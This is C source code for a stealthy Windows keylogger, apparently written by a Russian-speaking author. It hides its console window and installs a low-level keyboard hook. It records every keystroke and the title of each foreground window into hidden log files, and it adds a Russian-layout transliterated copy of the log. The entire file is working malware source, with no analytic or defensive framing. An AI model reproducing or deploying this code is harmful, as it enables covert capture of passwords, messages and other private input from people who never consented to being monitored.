#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <malloc.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>
#include <locale.h>

#define FILENAME "logklg2.txt"
#define FILERUSNAME "logklg2rus.txt"
#define SIZESTR 128

LRESULT __stdcall KeyBoardRead(int nCode, WPARAM wParam, LPARAM lParam);
bool IsCaps();
char* GetTimeStart();
char* GetBatteryPowerStatus();
int SaveActiveWindowName();
int SaveData(char *, bool rusflag);
char *TranslateToRus(char*);
void *ec_malloc(unsigned int);
void Customization(void) __attribute__ ((constructor));
void CleanUp(void) __attribute__ ((destructor));

HWND last_window_hwnd;
HHOOK kbhook;

char RUS[] = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюя№;:?\0";
char ENG[] = "F,DULT`;PBQRKVYJGHCNEA[WXIO]SM\".Zf,dult`;pbqrkvyjghcnea[wxio]sm\'.z#$^&\0";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	MSG msg = {0};
	while(GetMessage(&msg, NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	exit(0);
}

LRESULT __stdcall KeyBoardRead(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode != 0) return CallNextHookEx(NULL, nCode, wParam, lParam);
	SaveActiveWindowName();
	if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		PKBDLLHOOKSTRUCT kbhstruct = (PKBDLLHOOKSTRUCT)lParam;
		unsigned int ikey;
		char *key_name;
		char *buf;
		bool rusflag = false;
		switch(kbhstruct->vkCode)
		{
			case VK_RETURN: SaveData("\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_SPACE: SaveData("\x20", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_PRIOR: SaveData("[Page up]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_NEXT: SaveData("[Page down]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_END: SaveData("[End]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_HOME: SaveData("[Home]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_LEFT: SaveData("[Arrow left]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_UP: SaveData("[Arrow up]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_DOWN: SaveData("[Arrow down]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_RIGHT: SaveData("[Arrow right]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_SNAPSHOT: SaveData("[Prt sc]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_LWIN: SaveData("[L win]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_RWIN: SaveData("[R win]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_SLEEP: SaveData("[SLEEP]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
			case VK_NUMLOCK: SaveData("[Num lock]\n", false); return CallNextHookEx(NULL, nCode, wParam, lParam);
		}
		ikey = MapVirtualKeyEx(kbhstruct->vkCode, 0x0, 0)<<16;
		key_name = (char*)calloc(SIZESTR-1, sizeof(char));
		GetKeyNameText(ikey, key_name, SIZESTR-1);
		buf = (char*)ec_malloc(sizeof(char)*(strlen(key_name) + 4));
		memset(buf, 0, _msize(buf));
		if(strlen(key_name) > 1)
		{
			sprintf(buf, "[%s]\n", key_name);
		}
		else
		{
			rusflag = true;
			if(!IsCaps())
				key_name[0] = tolower(key_name[0]);
			strncpy(buf, key_name, strlen(key_name));
		}
		SaveData(buf, rusflag);
		free(buf);
		free(key_name);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool IsCaps() {return (GetKeyState(0x14) & 0x1) != 0 ^ (GetKeyState(0x10) & 0x8000) != 0;}

char *GetTimeStart()
{
	time_t t = time(NULL);
	return ctime(&t);
}

char *GetBatteryPowerStatus()
{
	char *buf = (char*)ec_malloc(SIZESTR*sizeof(char));
	SYSTEM_POWER_STATUS sys_power_stat;
	memset(buf, 0, SIZESTR);
	GetSystemPowerStatus(&sys_power_stat);
	if(sys_power_stat.ACLineStatus == 0 || sys_power_stat.ACLineStatus == 1 && sys_power_stat.BatteryFlag ^ 0xff & 0x8 == 0)
		sprintf(buf,"Power status - %d %", sys_power_stat.BatteryLifePercent);
	else
		strcpy(buf, "connected to AC power");
	return buf;
}

int SaveActiveWindowName()
{
	HWND active_window_hwnd = GetForegroundWindow();
	if(active_window_hwnd == last_window_hwnd) return 0;
	last_window_hwnd = active_window_hwnd;
	char *name_active_window = (char*)ec_malloc(SIZESTR);
	GetWindowText(last_window_hwnd, name_active_window, SIZESTR);
	SaveData("\n----------New Window Active----------\n", false);
	SaveData(name_active_window, false);
	SaveData("\n", false);
	free(name_active_window);
	CloseHandle(active_window_hwnd);
	return 1;
}

int SaveData(char *data, bool rusflag)
{
	FILE *fileD = fopen(FILENAME, "a+");
	if(fileD == NULL) return 0;
	fwrite(data, sizeof(char), strlen(data), fileD);
	fclose(fileD);
	fileD = fopen(FILERUSNAME, "a+");
	if(rusflag)
	{
		char *rutext = TranslateToRus(data);
		fwrite(rutext, sizeof(char), strlen(rutext), fileD);
		free(rutext);
	}
	else
		fwrite(data, sizeof(char), strlen(data), fileD);
	fclose(fileD);
	return 1;
}

char *TranslateToRus(char *eng_data)
{
	char *bufrus = (char*)ec_malloc(strlen(eng_data)*sizeof(char)*2);
	unsigned int i,j, sz = _msize(bufrus);
	memset(bufrus, '\x20', sz);
	*(bufrus + (char)sz) = 0;
	for(i = 0; i < strlen(eng_data); i++)
	{
		for(j = 0; j < strlen(ENG); j++)
		{
			if(eng_data[i] == ENG[j])
			{
				*(bufrus+(char)i*2) = *(RUS+(char)j*2);
				*(bufrus+(char)i*2+1) = *(RUS+(char)j*2+1);
				break;
			}
		}
	}
	return bufrus;
}

void *ec_malloc(unsigned int size)
{
	void *ptr = malloc(size);
	if(ptr == NULL)
		exit(0);
	return ptr;
}

void Customization(void)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HANDLE hf = CreateFileA(FILENAME, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(hf);
	hf = CreateFileA(FILERUSNAME, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hf, "\xEF\xBB\xBF\n", 4, NULL, NULL);
	CloseHandle(hf);
	SaveData("\n==========[START]==========\n", false);
	SaveData(GetTimeStart(), false);
	SaveData("{Power Status}: ", false);
	SaveData(GetBatteryPowerStatus(), false);
	SaveData("\n", false);
	kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyBoardRead, NULL, 0);
}

void CleanUp(void)
{
	SaveData("{Power Status}: ", false);
	SaveData(GetBatteryPowerStatus(), false);
	SaveData("\n", false);
	SaveData(GetTimeStart(), false);
	SaveData("==========Shutdown==========\n", false);
	UnhookWindowsHookEx(kbhook);
	CloseHandle(last_window_hwnd);
}